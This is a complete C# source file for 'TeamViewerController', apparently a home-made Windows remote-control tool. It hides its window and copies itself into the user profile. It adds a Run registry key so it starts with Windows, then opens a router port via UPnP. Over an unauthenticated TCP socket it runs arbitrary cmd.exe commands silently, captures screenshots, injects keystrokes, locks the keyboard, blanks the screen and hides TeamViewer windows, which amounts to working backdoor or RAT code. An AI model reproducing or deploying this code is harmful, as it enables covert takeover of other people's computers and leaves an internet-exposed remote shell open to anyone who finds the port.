using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.Net.NetworkInformation;
using Open.Nat;
using System.Threading;
using System.Windows.Forms;
using System.IO;
using System.ComponentModel;
using System.Drawing.Imaging;
using System.Drawing;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using KeyboardHookMain;

namespace TeamViewerController
{
    public partial class Form1 : Form
    {



        public static TcpClient client;
        public static TcpListener listener;
        public static string IPstring;
        public static IPEndPoint ipEP;
        public static bool clientIsOpen;
        public static int portValue = 8888;
        public static int outerPortValue = 8888;
        public static int connectToPort;

        private string FindByDisplayName(RegistryKey parentKey, string name)
        {
            string[] nameList = parentKey.GetSubKeyNames();
            for (int i = 0; i < nameList.Length; i++)
            {
                RegistryKey regKey = parentKey.OpenSubKey(nameList[i]);
                try
                {
                    if (regKey.GetValue("DisplayName").ToString() == name)
                    {
                        return regKey.GetValue("InstallLocation").ToString();
                    }
                }
                catch { }
            }
            return "";
        }

        public static /*async*/ void writeMessage(string input)
        {
            try
            {
                NetworkStream ns = client.GetStream();
                byte[] message = Encoding.ASCII.GetBytes(input);
                ns.Write(message, 0, message.Length);
            }
            catch (Exception ex)
            {
                
            }
        }

        bool TeamViewerRunning;
        bool PCLocked;
        Form2 f2 = new Form2();
        bool ScreenBlanked;
        NotifyIcon notifyIcon = new NotifyIcon();
        public void ListenToClient(object sender, DoWorkEventArgs e)
        {
            IPstring = GetLocalNetworkIPV4();


            IPGlobalProperties ipGlobalProperties = IPGlobalProperties.GetIPGlobalProperties();
            TcpConnectionInformation[] tcpConnInfoArray = ipGlobalProperties.GetActiveTcpConnections();

            foreach (TcpConnectionInformation tcpi in tcpConnInfoArray)
            {
                if (tcpi.LocalEndPoint.Port == portValue)
                {
                    Debug.WriteLine("Could not open port \"" + portValue + "\" as it is already in use!");
                    return;
                }
            }

            try
            {

                ipEP = new IPEndPoint(IPAddress.Parse(IPstring), portValue); //allow a way to set the port in the future
                listener = new TcpListener(ipEP);
            }
            catch (Exception ex)
            {
                Debug.WriteLine("ERROR: " + ex.Message);
            }

            try
            {
                //listener.AllowNatTraversal(true);
                listener.Start();

                OpenPort();





                client = listener.AcceptTcpClient();
                clientIsOpen = true;
            }
            catch (Exception ex)
            {
                Console.WriteLine("ERROR: " + ex.Message);
                Console.ReadLine();
            }

            while (client.Connected)
            {
                try
                {
                    const int bytesize = 1024;
                    byte[] buffer = new byte[bytesize];
                    string networkRead = client.GetStream().Read(buffer, 0, bytesize).ToString();
                    string data = ASCIIEncoding.ASCII.GetString(buffer);

                    if (data.Contains("{Screenshot}"))
                    {
                        //var bitmap = SaveScreenshot();
                        var bitmap = SaveScreenshotWithMousePointer();

                        var stream = new MemoryStream();
                        bitmap.Save(stream, ImageFormat.Bmp);
                        Debug.WriteLine("Getting stream size: " + stream.Length);
                        sendData(stream.ToArray(), client.GetStream(), 1024 * 256);
                    } else if (data.Contains("{OpenTV}"))
                    {
                        try
                        {
                            foreach (Process p in Process.GetProcesses())
                            {
                                if (p.ProcessName == "TeamViewer")
                                {
                                    TeamViewerRunning = true;
                                    break;
                                }
                                else
                                {
                                    TeamViewerRunning = false;
                                }
                            }

                            if (!TeamViewerRunning)
                            {
                                Process.Start(TeamViewerLocation);
                            }
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine("ERROR: " + ex.Message);
                        }
                    }
                    else if (data.Contains("{KillTV}"))
                    {
                        foreach (Process p in Process.GetProcesses())
                        {
                            if (p.ProcessName == "TeamViewer")
                            {
                                p.Kill();
                                break;
                            }
                        }
                    }
                    else if (data.Contains("{ScreenON}"))
                    {
                        SetMonitorState(MonitorState.ON);
                        mouse_event(MOUSEEVENTF_MOVE, 0, 0, 0, UIntPtr.Zero);
                    } else if (data.Contains("{ScreenOFF}"))
                    {
                        SetMonitorState(MonitorState.OFF);
                    }
                    else if (data.Contains("{UnlockKeyboard}"))
                    {
                        Invoke(new Action(() => TryLockKeyboard(false)));
                    }
                    else if (data.Contains("{LockKeyboard}"))
                    {
                        Invoke(new Action(() => TryLockKeyboard(true)));
                    }
                    else if (data.Contains("{cmd}") && data.Contains("{/cmd}"))
                    {
                        string cmdMessage = getBetween(data, "{cmd}", "{/cmd}");

                        var processInfo = new ProcessStartInfo("cmd.exe", "/c " + cmdMessage)
                        {
                            CreateNoWindow = true,
                            UseShellExecute = false,
                            RedirectStandardError = true,
                            RedirectStandardOutput = true,
                            WorkingDirectory = @"C:\Windows\System32\"
                        };

                        Process.Start(processInfo);
                    } 
                    else if (data.Contains("{key}") && data.Contains("{/key}"))
                    {
                        string keyMessage = getBetween(data, "{key}", "{/key}");

                        try
                        {
                            SendKeys.SendWait(keyMessage);
                        }
                        catch (Exception ex)
                        {
                        }
                    }
                    else if (data.Contains("{tip}") && data.Contains("{/tip}"))
                    {
                        string tipData = getBetween(data, "{tip}", "{/tip}");

                        int duration = 0;
                        string title = "";
                        string text = "";
                        ToolTipIcon icon = 0;

                        notifyIcon.Visible = true;
                        try
                        {
                            duration = int.Parse(getBetween(tipData, "{d}", "{/d}"));
                            title = getBetween(tipData, "{t}", "{/t}");
                            text = getBetween(tipData, "{txt}", "{/txt}");
                            icon = (ToolTipIcon)Enum.Parse(typeof(ToolTipIcon), getBetween(tipData, "{i}", "{/i}"));
                            notifyIcon.ShowBalloonTip(duration, title, text, icon);

                            Debug.WriteLine("showing balloon");
                        }
                        catch (Exception ex)
                        {
                            notifyIcon.Visible = false;
                            return;
                        }
                        notifyIcon.Visible = false;

                    }
                    else if (data.Contains("{UnblankScreen}"))
                    {
                        Invoke(new Action(() => TryBlankScreen(false)));
                    } else if (data.Contains("{BlankScreen}"))
                    {
                        Invoke(new Action(() => TryBlankScreen(true)));
                    }
                    else if (data.Contains("{HideTV}"))
                    {
                        Invoke(new Action(() => TryShowTeamViewer(false)));
                    } else if (data.Contains("{ShowTV}"))
                    {
                        Invoke(new Action(() => TryShowTeamViewer(true)));
                    } else if (data.Contains("{moveu}") && data.Contains("{/moveu}"))
                    {
                        int distance = int.Parse(getBetween(data, "{moveu}", "{/moveu}"));

                        mouse_event(MOUSEEVENTF_MOVE, 0, -distance, 0, UIntPtr.Zero);
                    } else if (data.Contains("{moved}") && data.Contains("{/moved}"))
                    {
                        int distance = int.Parse(getBetween(data, "{moved}", "{/moved}"));

                        mouse_event(MOUSEEVENTF_MOVE, 0, distance, 0, UIntPtr.Zero);
                    } else if (data.Contains("{movel}") && data.Contains("{/movel}"))
                    {
                        int distance = int.Parse(getBetween(data, "{movel}", "{/movel}"));

                        mouse_event(MOUSEEVENTF_MOVE, -distance, 0, 0, UIntPtr.Zero);
                    } else if (data.Contains("{mover}") && data.Contains("{/mover}"))
                    {
                        int distance = int.Parse(getBetween(data, "{mover}", "{/mover}"));

                        mouse_event(MOUSEEVENTF_MOVE, distance, 0, 0, UIntPtr.Zero);
                    } else if (data.Contains("{click}"))
                    {
                        LeftMouseClick();
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine("Exception WHILE Listening: " + ex.Message);
                    Console.ReadLine();
                    client.GetStream().Close();
                    client.Close();
                    clientIsOpen = false;
                }
            }
        }


        public void TryLockKeyboard(bool b)
        {
            if (b)
            {
                if (PCLocked || ScreenBlanked)
                    return;

                PCLocked = true;
                this.Invoke(new Action(() => KeyboardHook.EngageFullKeyboardLockdown()));
            }
            else
            {
                if (!PCLocked)
                    return;

                PCLocked = false;
                this.Invoke(new Action(() => KeyboardHook.ReleaseFullKeyboardLockdown()));

            }
        }

        public void TryBlankScreen(bool b)
        {
            if (b)
            {
                if (ScreenBlanked || PCLocked)
                    return;

                ScreenBlanked = true;
                Invoke(new Action(() => KeyboardHookMain.KeyboardHook.EngageFullKeyboardLockdown()));
                Invoke(new Action(() => f2.Show()));
                Invoke(new Action(() => SetWindowPos(this.Handle, HWND_TOPMOST, 0, 0, 0, 0, TOPMOST_FLAGS)));
            } 
            else
            {
                if (!ScreenBlanked)
                    return;

                ScreenBlanked = false;
                Invoke(new Action(() => KeyboardHookMain.KeyboardHook.ReleaseFullKeyboardLockdown()));
                Invoke(new Action(() => f2.Hide()));
                Invoke(new Action(() => SetWindowPos(this.Handle, HWND_NOTOPMOST, 0, 0, 0, 0, TOPMOST_FLAGS)));
            }
        }

        List<IntPtr> TeamViewerHandles = new List<IntPtr>();
        public void TryShowTeamViewer(bool b)
        {
            RefreshTVHandle();

            if (b)
            {
                if (!(TeamViewerHandles.Count > 0))
                    return;

                for (int i = 0; i < TeamViewerHandles.Count; i++)
                {
                    ShowWindowAsync(TeamViewerHandles[i], SW_SHOW);
                    SetForegroundWindow(TeamViewerHandles[i]);
                }
                TeamViewerHandles.Clear();
            }
            else
            {
                for (int i = 0; i < windows.Count; i++)
                {
                    if (windows[i].Title == "TeamViewer" || windows[i].Title.Contains(" TeamViewer ")) //Contains("- TeamViewer -") also works
                    {
                        //MessageBox.Show(windows[i].Title);
                        ShowWindowAsync(windows[i].Handle, SW_HIDE);

                        TeamViewerHandles.Add(windows[i].Handle);
                    }
                }
            }
        }

        public void RefreshTVHandle()
        {
            GetWindows();

        }



        #region Window Explorer

        [DllImport("user32.dll")]
        private static extern IntPtr GetWindowLong(IntPtr hWnd, int nIndex);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool IsWindow(IntPtr hWnd);



        [DllImport("user32.dll")]
        static extern bool SetForegroundWindow(IntPtr hWnd);

        [DllImport("user32.dll")]
        static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
        const int WS_CHILD = 4;
        const int SW_MAXIMIZE = 3;
        const int SW_SHOW = 5;
        const int SW_HIDE = 0;
        const int SW_SHOWNORMAL = 1;
        const int SW_RESTORE = 9;



        [DllImport("user32.dll")]
        static extern int EnumWindows(EnumWindowsCallback lpEnumFunc, int lParam);

        delegate bool EnumWindowsCallback(IntPtr hwnd, int lParam);

        [DllImport("user32.dll")]
        public static extern void GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll")]
        static extern ulong GetWindowLongA(IntPtr hWnd, int nIndex);

        static readonly int GWL_STYLE = -16;

        static readonly ulong WS_VISIBLE = 0x10000000L;
        static readonly ulong WS_BORDER = 0x00800000L;
        static readonly ulong TARGETWINDOW = WS_BORDER | WS_VISIBLE;

        internal class Window
        {
            public string Title;
            public IntPtr Handle;

            public override string ToString()
            {
                return Title;
            }
        }

        private List<Window> windows;

        private void GetWindows()
        {

            windows = new List<Window>();

            EnumWindows(Callback, 0);
        }

        private bool Callback(IntPtr hwnd, int lParam)
        {
            if (this.Handle != hwnd && (GetWindowLongA(hwnd, GWL_STYLE) & TARGETWINDOW) == TARGETWINDOW)
            {
                StringBuilder sb = new StringBuilder(200);
                GetWindowText(hwnd, sb, sb.Capacity);
                Window t = new Window();
                t.Handle = hwnd;
                t.Title = sb.ToString();
                windows.Add(t);
            }

            return true; //continue enumeration
        }

        #endregion



        #region Monitor Function
        [DllImport("user32.dll")]
        static extern IntPtr SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

        private int SC_MONITORPOWER = 0xF170;
        private int WM_SYSCOMMAND = 0x0112;

        public enum MonitorState
        {
            ON = -1,
            OFF = 2,
            STANDBY = 1
        }

        public void SetMonitorState(MonitorState state)
        {
            this.Invoke(new Action(() => SendMessage(this.Handle, WM_SYSCOMMAND, SC_MONITORPOWER, (int)state)));
        }


        [DllImport("user32.dll")]
        static extern void mouse_event(Int32 dwFlags, Int32 dx, Int32 dy, Int32 dwData, UIntPtr dwExtraInfo);
        private const int MOUSEEVENTF_MOVE = 0x0001;
        public const int MOUSEEVENTF_LEFTDOWN = 0x02;
        public const int MOUSEEVENTF_LEFTUP = 0x04;
        #endregion

        #region Windows Position Function

        private static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
        private static readonly IntPtr HWND_NOTOPMOST = new IntPtr(-2);
        private const UInt32 SWP_NOSIZE = 0x0001;
        private const UInt32 SWP_NOMOVE = 0x0002;
        private const UInt32 TOPMOST_FLAGS = SWP_NOMOVE | SWP_NOSIZE;
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

        #endregion

        public static string getDataAsString(TcpClient client)
        {
            byte[] bytes = getData(client);
            if (bytes != null)
            {
                return Encoding.ASCII.GetString(bytes);
            }
            else
            {
                return null;
            }
        }

        public static byte[] getData(TcpClient client)
        {
            try
            {
                NetworkStream stream = client.GetStream();
                byte[] fileSizeBytes = new byte[4];
                int bytes = stream.Read(fileSizeBytes, 0, fileSizeBytes.Length);
                Debug.WriteLine("BYTES TO GET: " + bytes);
                int dataLength = BitConverter.ToInt32(fileSizeBytes, 0);

                int bytesLeft = dataLength;
                byte[] data = new byte[dataLength];

                int buffersize = 1024;
                int bytesRead = 0;

                while (bytesLeft > 0)
                {
                    int curDataSize = Math.Min(buffersize, bytesLeft);
                    if (client.Available < curDataSize)
                    {
                        curDataSize = client.Available;
                    }

                    bytes = stream.Read(data, bytesRead, curDataSize);
                    bytesRead += curDataSize;
                    bytesLeft -= curDataSize;
                    Debug.WriteLine("DATA REMAINING: " + curDataSize);
                }

                return data;
            }
            catch (Exception ex)
            {
                return null;
            }
        }



        public static Bitmap SaveScreenshot()
        {
            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
            // Create a graphics object from the bitmap.  
            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);
            // Take the screenshot from the upper left corner to the right  
            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
            return bmpScreenshot;
        }


        public static class User32
        {
            public const Int32 CURSOR_SHOWING = 0x00000001;

            [StructLayout(LayoutKind.Sequential)]
            public struct ICONINFO
            {
                public bool fIcon;
                public Int32 xHotspot;
                public Int32 yHotspot;
                public IntPtr hbmMask;
                public IntPtr hbmColor;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct POINT
            {
                public Int32 x;
                public Int32 y;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct CURSORINFO
            {
                public Int32 cbSize;
                public Int32 flags;
                public IntPtr hCursor;
                public POINT ptScreenPos;
            }

            [DllImport("user32.dll")]
            public static extern bool GetCursorInfo(out CURSORINFO pci);

            [DllImport("user32.dll")]
            public static extern IntPtr CopyIcon(IntPtr hIcon);

            [DllImport("user32.dll")]
            public static extern bool DrawIcon(IntPtr hdc, int x, int y, IntPtr hIcon);

            [DllImport("user32.dll")]
            public static extern bool GetIconInfo(IntPtr hIcon, out ICONINFO piconinfo);
        }

        Bitmap SaveScreenshotWithMousePointer()
        {
            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
            // Create a graphics object from the bitmap.  
            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);
            // Take the screenshot from the upper left corner to the right  
            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);

            User32.CURSORINFO cursorInfo;
            cursorInfo.cbSize = Marshal.SizeOf(typeof(User32.CURSORINFO));

            if (User32.GetCursorInfo(out cursorInfo))
            {
                // if the cursor is showing draw it on the screen shot
                if (cursorInfo.flags == User32.CURSOR_SHOWING)
                {
                    // we need to get hotspot so we can draw the cursor in the correct position
                    var iconPointer = User32.CopyIcon(cursorInfo.hCursor);
                    User32.ICONINFO iconInfo;
                    int iconX, iconY;

                    if (User32.GetIconInfo(iconPointer, out iconInfo))
                    {
                        // calculate the correct position of the cursor
                        iconX = cursorInfo.ptScreenPos.x - ((int)iconInfo.xHotspot);
                        iconY = cursorInfo.ptScreenPos.y - ((int)iconInfo.yHotspot);

                        // draw the cursor icon on top of the captured screen image
                        User32.DrawIcon(gfxScreenshot.GetHdc(), iconX, iconY, cursorInfo.hCursor);

                        // release the handle created by call to g.GetHdc()
                        gfxScreenshot.ReleaseHdc();
                    }
                }
            }

            return bmpScreenshot;
        }


        public static int tryConnectTime = 1000;
        public static async Task<TcpClient> tryConnect() 
        {
            try
            {
                if (client == null)
                {
                    client = new TcpClient();
                }

                var connectionTask = client.ConnectAsync(IPAddress.Parse(IPstring), connectToPort).ContinueWith(task =>
                {
                    return task.IsFaulted ? null : client;
                }, TaskContinuationOptions.ExecuteSynchronously);
                var timeoutTask = Task.Delay(tryConnectTime).ContinueWith<TcpClient>(task => null, TaskContinuationOptions.ExecuteSynchronously);
                var resultTask = Task.WhenAny(connectionTask, timeoutTask).Unwrap();
                resultTask.Wait();
                var resultTcpClient = await resultTask;

                return resultTcpClient;
            }
            catch (Exception ex)
            {
                return null;
            }
        }

        static byte[] getBytes(string input)
        {
            byte[] bytes = Encoding.ASCII.GetBytes(input);
            return bytes;
        }

        public static void sendData(byte[] data, NetworkStream stream)
        {
            int bufferSize = 1024;
            byte[] dataLength = BitConverter.GetBytes(data.Length);
            stream.Write(dataLength, 0, 4);
            int bytesSent = 0;
            int bytesLeft = data.Length;
            while (bytesLeft > 0)
            {
                int curDataSize = Math.Min(bufferSize, bytesLeft);
                stream.Write(data, bytesSent, curDataSize);
                bytesSent += curDataSize;
                bytesLeft -= curDataSize;
            }
        }

        public static void sendData(byte[] data, NetworkStream stream, int customBufferSize)
        {
            byte[] dataLength = BitConverter.GetBytes(data.Length);
            stream.Write(dataLength, 0, 4);
            int bytesSent = 0;
            int bytesLeft = data.Length;
            while (bytesLeft > 0)
            {
                int curDataSize = Math.Min(customBufferSize, bytesLeft);
                stream.Write(data, bytesSent, curDataSize);
                bytesSent += curDataSize;
                bytesLeft -= curDataSize;
            }
        }

        public static string getBetween(string strSource, string strStart, string strEnd)
        {
            int Start, End;
            if (strSource.Contains(strStart) && strSource.Contains(strEnd))
            {
                Start = strSource.IndexOf(strStart, 0) + strStart.Length;
                End = strSource.IndexOf(strEnd, Start);
                return strSource.Substring(Start, End - Start);
            }
            else
            {
                return "";
            }
        }

        public static string GetLocalNetworkIPV4()
        {
            string localIP = "";
            bool OpenPort = false;
            using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
            {
                IPGlobalProperties ipGlobalProperties = IPGlobalProperties.GetIPGlobalProperties();
                TcpConnectionInformation[] tcpConnInfoArray = ipGlobalProperties.GetActiveTcpConnections();

                for (int i = 60000; i < 65535; i++)
                {
                    if (OpenPort)
                    {
                        Debug.WriteLine("Working Port Found");
                        break;
                    }

                    foreach (TcpConnectionInformation tcpi in tcpConnInfoArray)
                    {
                        if (tcpi.LocalEndPoint.Port == i)
                        {
                            Debug.WriteLine(i + " Is In Use");
                            break;
                        }
                        else
                        {
                            OpenPort = true;
                            socket.Connect("8.8.8.8", i);
                            IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
                            localIP = endPoint.Address.ToString();
                            break;
                        }
                    }

                }
            }

            return localIP;
        }



        public static async void OpenPort()
        {
            try
            {
                var discoverer = new NatDiscoverer();
                var device = await discoverer.DiscoverDeviceAsync();
                await device.CreatePortMapAsync(new Mapping(Protocol.Tcp, portValue, outerPortValue, "Inner Router"));

                var sb = new StringBuilder();
                var ip = await device.GetExternalIPAsync();

                sb.AppendFormat("\nAdded mapping: {0}:{1} -> 127.0.0.1:{2}\n", ip, outerPortValue, portValue);
                sb.AppendFormat("\n+------+-------------------------------+--------------------------------+------------------------------------+-------------------------+");
                sb.AppendFormat("\n| PROT | PUBLIC (Reacheable)           | PRIVATE (Your computer)        | Description                        |                         |");
                sb.AppendFormat("\n+------+----------------------+--------+-----------------------+--------+------------------------------------+-------------------------+");
                sb.AppendFormat("\n|      | IP Address           | Port   | IP Address            | Port   |                                    | Expires                 |");
                sb.AppendFormat("\n+------+----------------------+--------+-----------------------+--------+------------------------------------+-------------------------+");
                foreach (var mapping in await device.GetAllMappingsAsync())
                {
                    sb.AppendFormat("\n|  {5} | {0,-20} | {1,6} | {2,-21} | {3,6} | {4,-35}|{6,25}|",
                        ip, mapping.PublicPort, mapping.PrivateIP, mapping.PrivatePort, mapping.Description, mapping.Protocol == Protocol.Tcp ? "TCP" : "UDP", mapping.Expiration.ToLocalTime());
                }
                sb.AppendFormat("\n+------+----------------------+--------+-----------------------+--------+------------------------------------+-------------------------+");
            }
            catch (MappingException e)
            {
                Console.WriteLine(e.Message);
            }
            catch (WebException e)
            {
                Console.WriteLine(e.Message);
            }


        }

        public Form1()
        {
            InitializeComponent();
        }

        public void BeginListen()
        {
            this.Hide();
            this.ShowInTaskbar = false;

            worker = new BackgroundWorker();
            worker.DoWork += ListenToClient;
            worker.RunWorkerCompleted += Worker_RunWorkerCompleted;
            worker.RunWorkerAsync();
        }

        BackgroundWorker worker;
        
        string installLocation = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\RemoteAccess";
        private void Worker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            worker.DoWork -= ListenToClient;
            worker.RunWorkerCompleted -= Worker_RunWorkerCompleted;
            worker.Dispose();
            Debug.WriteLine("The Worker has stopped");
            worker = new BackgroundWorker();
            worker.DoWork += ListenToClient;
            worker.RunWorkerCompleted += Worker_RunWorkerCompleted;
            worker.RunWorkerAsync();
        }

        string TeamViewerLocation;
        private void Form1_Load(object sender, EventArgs e)
        {
            RegistryKey regKey = Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Uninstall");
            string location = FindByDisplayName(regKey, "TeamViewer");
            TeamViewerLocation = location + @"\" + "TeamViewer.exe";

            if (AppDomain.CurrentDomain.BaseDirectory == installLocation + @"\")
            {
                BeginListen();
            }
            else
            {
                this.Hide();
                this.ShowInTaskbar = false;
                newProgramFile = installLocation + @"\" + applicationName;

                foreach (Process p in Process.GetProcesses())
                {
                    if (p.ProcessName == "TeamViewerController")
                    {
                        p.Kill();
                    }
                }

                Thread.Sleep(5000);

                try
                {
                    RegistryKey key = Registry.CurrentUser.OpenSubKey(StartupKey, true);
                    key.SetValue(StartupValue, installLocation + @"\" + applicationName);
                }
                catch (Exception ex)
                {

                }

                try
                {

                    File.Delete(newProgramFile);
                    Thread.Sleep(1000);
                    File.Move(Application.ExecutablePath, newProgramFile);
                    Thread.Sleep(1000);
                    Process.Start(installLocation + @"\" + applicationName);

                    Thread.Sleep(1000);
                    Application.Exit();
                }
                catch (Exception ex)
                {

                }
            }

            f2.ShowInTaskbar = false;


            notifyIcon.Icon = SystemIcons.Information;
        }

        string newProgramFile;

        private static readonly string StartupKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
        private static readonly string StartupValue = "TeamViewerController";

        string applicationName = "TeamViewerController.exe";
        private void button1_Click(object sender, EventArgs e)
        {
            Directory.CreateDirectory(installLocation);
            try
            {
                File.Move(Application.ExecutablePath, newProgramFile);
                File.Move(AppDomain.CurrentDomain.BaseDirectory + "Open.Nat.dll", installLocation + @"\" + "Open.Nat.dll");
                RegistryKey key = Registry.CurrentUser.OpenSubKey(StartupKey, true);
                key.SetValue(StartupValue, installLocation + @"\" + applicationName);
            }
            catch (Exception ex)
            {
                Debug.WriteLine("ERROR: " + ex.Message);
            }
            Process.Start(installLocation + @"\" + applicationName);
            Thread.Sleep(10000);
            Application.Exit();
        }

        //[DllImport("user32.dll")]
        //static extern bool SetCursorPos(int x, int y);


        //This simulates a left mouse click
        //public static void LeftMouseClick(int xpos, int ypos)
        //{
        //    SetCursorPos(xpos, ypos);
        //    mouse_event(MOUSEEVENTF_LEFTDOWN, xpos, ypos, 0, 0);
        //    mouse_event(MOUSEEVENTF_LEFTUP, xpos, ypos, 0, 0);
        //}


        [DllImport("user32.dll")]
        public static extern bool GetCursorPos(out Point lpPoint);

        static Point p;
        public static void LeftMouseClick()
        {
            GetCursorPos(out p);
            //SetCursorPos(xpos, ypos);
            mouse_event(MOUSEEVENTF_LEFTDOWN, p.X, p.Y, 0, UIntPtr.Zero);
            mouse_event(MOUSEEVENTF_LEFTUP, p.X, p.Y, 0, UIntPtr.Zero);
        }
    }
}
